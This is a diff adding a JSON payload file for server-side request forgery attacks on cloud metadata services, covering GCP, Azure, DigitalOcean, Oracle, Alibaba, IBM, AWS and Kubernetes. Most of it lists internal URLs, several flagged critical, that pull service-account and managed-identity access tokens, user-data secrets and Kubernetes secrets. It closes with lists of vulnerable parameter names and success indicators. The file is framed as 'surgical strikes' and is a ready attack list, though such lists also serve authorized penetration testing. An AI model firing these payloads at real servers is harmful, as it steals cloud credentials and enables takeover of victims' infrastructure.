@@ -1,0 +1,482 @@
+{
+  "info": {
+    "name": "SSRF Cloud Metadata Payloads - GCP/Azure/DigitalOcean",
+    "author": "CyberDyne Security",
+    "version": "2.0",
+    "description": "SSRF payloads for cloud metadata - GCP, Azure, DigitalOcean, Oracle, and Kubernetes. 2026 Edition.",
+    "category": "Injection",
+    "severity": "CRITICAL",
+    "owasp": "A10:2021 - Server-Side Request Forgery",
+    "references": ["AWS IMDS", "GCP Metadata", "Azure Instance Metadata"]
+  },
+  "philosophy": "Cloud metadata is gold. Each provider has different endpoints. These payloads are surgical strikes at each cloud platform.",
+  "payloads": {
+    "gcp_google_cloud": [
+      {
+        "url": "http://metadata.google.internal/computeMetadata/v1/",
+        "description": "GCP metadata root",
+        "provider": "gcp",
+        "indicator": "instance"
+      },
+      {
+        "url": "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
+        "description": "GCP instance hostname",
+        "provider": "gcp",
+        "indicator": "hostname"
+      },
+      {
+        "url": "http://metadata.google.internal/computeMetadata/v1/instance/id",
+        "description": "GCP instance ID",
+        "provider": "gcp",
+        "indicator": "numeric ID"
+      },
+      {
+        "url": "http://metadata.google.internal/computeMetadata/v1/instance/zone",
+        "description": "GCP instance zone",
+        "provider": "gcp",
+        "indicator": "zone"
+      },
+      {
+        "url": "http://metadata.google.internal/computeMetadata/v1/instance/machine-type",
+        "description": "GCP machine type",
+        "provider": "gcp",
+        "indicator": "machine-type"
+      },
+      {
+        "url": "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/mac",
+        "description": "GCP network MAC address",
+        "provider": "gcp",
+        "indicator": "mac address"
+      },
+      {
+        "url": "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/ip",
+        "description": "GCP network IP",
+        "provider": "gcp",
+        "indicator": "ip address"
+      },
+      {
+        "url": "http://metadata.google.internal/computeMetadata/v1/instance/attributes/",
+        "description": "GCP instance attributes",
+        "provider": "gcp",
+        "indicator": "attributes"
+      },
+      {
+        "url": "http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env",
+        "description": "GKE kube-env (contains cluster info)",
+        "provider": "gcp",
+        "indicator": "kube-env, kubelet"
+      },
+      {
+        "url": "http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script",
+        "description": "GCP startup script",
+        "provider": "gcp",
+        "indicator": "startup-script"
+      },
+      {
+        "url": "http://metadata.google.internal/computeMetadata/v1/project/project-id",
+        "description": "GCP project ID",
+        "provider": "gcp",
+        "indicator": "project-id"
+      },
+      {
+        "url": "http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id",
+        "description": "GCP numeric project ID",
+        "provider": "gcp",
+        "indicator": "numeric project ID"
+      },
+      {
+        "url": "http://metadata.google.internal/computeMetadata/v1/project/attributes/",
+        "description": "GCP project attributes",
+        "provider": "gcp",
+        "indicator": "project attributes"
+      }
+    ],
+    "gcp_service_account_tokens": [
+      {
+        "url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+        "description": "GCP default SA token",
+        "provider": "gcp",
+        "indicator": "access_token",
+        "severity": "CRITICAL"
+      },
+      {
+        "url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email",
+        "description": "GCP default SA email",
+        "provider": "gcp",
+        "indicator": "service account email"
+      },
+      {
+        "url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes",
+        "description": "GCP default SA scopes",
+        "provider": "gcp",
+        "indicator": "scopes"
+      },
+      {
+        "url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
+        "description": "GCP all service accounts",
+        "provider": "gcp",
+        "indicator": "service accounts list"
+      },
+      {
+        "url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/{email}/token",
+        "description": "GCP specific SA token (enumerate)",
+        "provider": "gcp",
+        "indicator": "access_token",
+        "severity": "CRITICAL"
+      }
+    ],
+    "azure_imds": [
+      {
+        "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+        "description": "Azure metadata root",
+        "provider": "azure",
+        "indicator": "compute"
+      },
+      {
+        "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01&format=text",
+        "description": "Azure metadata as text",
+        "provider": "azure",
+        "indicator": "plain text metadata"
+      },
+      {
+        "url": "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01",
+        "description": "Azure compute info",
+        "provider": "azure",
+        "indicator": "vmId, subscriptionId"
+      },
+      {
+        "url": "http://169.254.169.254/metadata/instance/network/interface?api-version=2021-02-01",
+        "description": "Azure network interfaces",
+        "provider": "azure",
+        "indicator": "ipAddress"
+      },
+      {
+        "url": "http://169.254.169.254/metadata/instance/compute/storageAccount?api-version=2021-02-01",
+        "description": "Azure storage account",
+        "provider": "azure",
+        "indicator": "storage account name"
+      },
+      {
+        "url": "http://169.254.169.254/metadata/instance/compute/osType?api-version=2021-02-01",
+        "description": "Azure OS type",
+        "provider": "azure",
+        "indicator": "Linux or Windows"
+      },
+      {
+        "url": "http://169.254.169.254/metadata/instance/compute/vmId?api-version=2021-02-01",
+        "description": "Azure VM ID",
+        "provider": "azure",
+        "indicator": "vmId"
+      }
+    ],
+    "azure_managed_identity": [
+      {
+        "url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
+        "description": "Azure MI token (management.azure.com)",
+        "provider": "azure",
+        "indicator": "access_token",
+        "severity": "CRITICAL"
+      },
+      {
+        "url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/",
+        "description": "Azure MI token (vault.azure.net)",
+        "provider": "azure",
+        "indicator": "access_token",
+        "severity": "CRITICAL"
+      },
+      {
+        "url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/",
+        "description": "Azure MI token (storage.azure.com)",
+        "provider": "azure",
+        "indicator": "access_token",
+        "severity": "CRITICAL"
+      },
+      {
+        "url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.windows.net/",
+        "description": "Azure MI token (graph.windows.net)",
+        "provider": "azure",
+        "indicator": "access_token",
+        "severity": "CRITICAL"
+      },
+      {
+        "url": "http://169.254.169.254/metadata/identity/info?api-version=2018-02-01",
+        "description": "Azure MI info (tenant, client)",
+        "provider": "azure",
+        "indicator": "tenantId, clientId"
+      }
+    ],
+    "azure_attested": [
+      {
+        "url": "http://169.254.169.254/metadata/attested/document?api-version=2021-02-01",
+        "description": "Azure attested document",
+        "provider": "azure",
+        "indicator": "nonce, subscriptionId"
+      },
+      {
+        "url": "http://169.254.169.254/metadata/attested/document?api-version=2021-02-01&format=text",
+        "description": "Azure attested as text",
+        "provider": "azure",
+        "indicator": "plain text attested"
+      }
+    ],
+    "digitalocean_metadata": [
+      {
+        "url": "http://169.254.169.254/metadata/v1.json",
+        "description": "DO metadata root",
+        "provider": "digitalocean",
+        "indicator": "droplet_id"
+      },
+      {
+        "url": "http://169.254.169.254/metadata/v1/id",
+        "description": "DO droplet ID",
+        "provider": "digitalocean",
+        "indicator": "droplet ID"
+      },
+      {
+        "url": "http://169.254.169.254/metadata/v1/hostname",
+        "description": "DO hostname",
+        "provider": "digitalocean",
+        "indicator": "hostname"
+      },
+      {
+        "url": "http://169.254.169.254/metadata/v1/user-data",
+        "description": "DO user data (contains scripts, secrets)",
+        "provider": "digitalocean",
+        "indicator": "user-data, may contain secrets",
+        "severity": "CRITICAL"
+      },
+      {
+        "url": "http://169.254.169.254/metadata/v1/vendor-data",
+        "description": "DO vendor data",
+        "provider": "digitalocean",
+        "indicator": "vendor-data"
+      },
+      {
+        "url": "http://169.254.169.254/metadata/v1/interfaces",
+        "description": "DO network interfaces",
+        "provider": "digitalocean",
+        "indicator": "interfaces, ips"
+      },
+      {
+        "url": "http://169.254.169.254/metadata/v1/keys",
+        "description": "DO SSH keys",
+        "provider": "digitalocean",
+        "indicator": "ssh_keys"
+      },
+      {
+        "url": "http://169.254.169.254/metadata/v1/region",
+        "description": "DO region",
+        "provider": "digitalocean",
+        "indicator": "region"
+      }
+    ],
+    "oracle_cloud_metadata": [
+      {
+        "url": "http://192.0.0.192/latest/",
+        "description": "Oracle Cloud metadata root",
+        "provider": "oracle",
+        "indicator": "instance"
+      },
+      {
+        "url": "http://192.0.0.192/latest/instance-id",
+        "description": "Oracle instance ID",
+        "provider": "oracle",
+        "indicator": "instance-id"
+      },
+      {
+        "url": "http://192.0.0.192/latest/instance",
+        "description": "Oracle instance info",
+        "provider": "oracle",
+        "indicator": "instance details"
+      },
+      {
+        "url": "http://192.0.0.192/latest/userData",
+        "description": "Oracle user data",
+        "provider": "oracle",
+        "indicator": "userData, may contain secrets",
+        "severity": "CRITICAL"
+      },
+      {
+        "url": "http://192.0.0.192/latest/metadata/",
+        "description": "Oracle metadata directory",
+        "provider": "oracle",
+        "indicator": "metadata"
+      },
+      {
+        "url": "http://169.254.169.254/openstack/latest/meta_data.json",
+        "description": "OpenStack compatible metadata",
+        "provider": "oracle",
+        "indicator": "meta_data"
+      }
+    ],
+    "alibaba_cloud": [
+      {
+        "url": "http://100.100.100.200/latest/meta-data/",
+        "description": "Alibaba Cloud metadata root",
+        "provider": "alibaba",
+        "indicator": "instance-id"
+      },
+      {
+        "url": "http://100.100.100.200/latest/meta-data/instance-id",
+        "description": "Alibaba instance ID",
+        "provider": "alibaba",
+        "indicator": "instance-id"
+      },
+      {
+        "url": "http://100.100.100.200/latest/meta-data/instance-type",
+        "description": "Alibaba instance type",
+        "provider": "alibaba",
+        "indicator": "instance-type"
+      },
+      {
+        "url": "http://100.100.100.200/latest/user-data/",
+        "description": "Alibaba user data",
+        "provider": "alibaba",
+        "indicator": "user-data",
+        "severity": "CRITICAL"
+      },
+      {
+        "url": "http://100.100.100.200/latest/meta-data/owner-account-id",
+        "description": "Alibaba owner account ID",
+        "provider": "alibaba",
+        "indicator": "owner-account-id"
+      }
+    ],
+    "kubernetes_in_cluster": [
+      {
+        "url": "http://kubernetes.default.svc/api/v1/namespaces/default/pods",
+        "description": "K8s list pods in default namespace",
+        "provider": "kubernetes",
+        "indicator": "pods"
+      },
+      {
+        "url": "http://kubernetes.default.svc/api/v1/secrets",
+        "description": "K8s list secrets",
+        "provider": "kubernetes",
+        "indicator": "secrets",
+        "severity": "CRITICAL"
+      },
+      {
+        "url": "http://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets",
+        "description": "K8s kube-system secrets",
+        "provider": "kubernetes",
+        "indicator": "kube-system secrets",
+        "severity": "CRITICAL"
+      },
+      {
+        "url": "http://kubernetes.default.svc/api/v1/services",
+        "description": "K8s list services",
+        "provider": "kubernetes",
+        "indicator": "services"
+      },
+      {
+        "url": "http://kubernetes.default.svc/api/v1/namespaces/default/configmaps",
+        "description": "K8s configmaps",
+        "provider": "kubernetes",
+        "indicator": "configmaps"
+      },
+      {
+        "url": "http://kubernetes.default.svc/api/v1/serviceaccounts",
+        "description": "K8s service accounts",
+        "provider": "kubernetes",
+        "indicator": "serviceaccounts"
+      },
+      {
+        "url": "http://kubernetes.default.svc/api/v1/nodes",
+        "description": "K8s list nodes",
+        "provider": "kubernetes",
+        "indicator": "nodes"
+      }
+    ],
+    "kubernetes_service_account_tokens": [
+      {
+        "url": "http://kubernetes.default.svc/api/v1/namespaces/default/serviceaccounts/default/token",
+        "description": "K8s default SA token request",
+        "provider": "kubernetes",
+        "indicator": "token request",
+        "severity": "CRITICAL"
+      },
+      {
+        "url": "http://kubernetes.default.svc/.well-known/openid-configuration",
+        "description": "K8s OIDC configuration",
+        "provider": "kubernetes",
+        "indicator": "oidc configuration"
+      },
+      {
+        "url": "http://kubernetes.default.svc/openid/v1/jwks",
+        "description": "K8s JWKS endpoint",
+        "provider": "kubernetes",
+        "indicator": "jwks"
+      }
+    ],
+    "ibm_cloud": [
+      {
+        "url": "http://169.254.169.254/latest/meta-data/",
+        "description": "IBM Cloud metadata root",
+        "provider": "ibm",
+        "indicator": "instance-id"
+      },
+      {
+        "url": "http://169.254.169.254/latest/meta-data/instance-id",
+        "description": "IBM instance ID",
+        "provider": "ibm",
+        "indicator": "instance-id"
+      },
+      {
+        "url": "http://169.254.169.254/latest/user-data",
+        "description": "IBM user data",
+        "provider": "ibm",
+        "indicator": "user-data",
+        "severity": "CRITICAL"
+      }
+    ],
+    "aws_imds_v2_token": [
+      {
+        "url": "http://169.254.169.254/latest/api/token",
+        "description": "AWS IMDSv2 token (PUT request needed first)",
+        "provider": "aws",
+        "indicator": "token",
+        "technique": "Requires PUT to get token first"
+      },
+      {
+        "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        "description": "AWS IAM role credentials path",
+        "provider": "aws",
+        "indicator": "role name"
+      },
+      {
+        "url": "http://169.254.169.254/latest/dynamic/instance-identity/signature",
+        "description": "AWS instance signature",
+        "provider": "aws",
+        "indicator": "signature"
+      }
+    ]
+  },
+  "detection_indicators": {
+    "gcp": ["google", "project", "zone", "instance-id", "machine-type"],
+    "azure": ["vmId", "subscriptionId", "tenantId", "clientId"],
+    "digitalocean": ["droplet_id", "hostname", "user-data"],
+    "oracle": ["instance-id", "userData"],
+    "alibaba": ["instance-id", "owner-account-id"],
+    "kubernetes": ["apiVersion", "kind", "metadata", "items"],
+    "ibm": ["instance-id"]
+  },
+  "vulnerable_parameters": [
+    "url", "src", "dest", "redirect", "uri", "path", "proxy", "fetch", "load",
+    "endpoint", "link", "domain", "host", "site", "callback", "return",
+    "feed", "target", "api", "server", "resource", "open", "navigation"
+  ],
+  "success_indicators": [
+    "access_token",
+    "refresh_token", 
+    "vmId",
+    "subscriptionId",
+    "instance-id",
+    "droplet_id",
+    "project-id",
+    "tenantId",
+    "clientId",
+    "user-data",
+    "apiVersion"
+  ]
+}
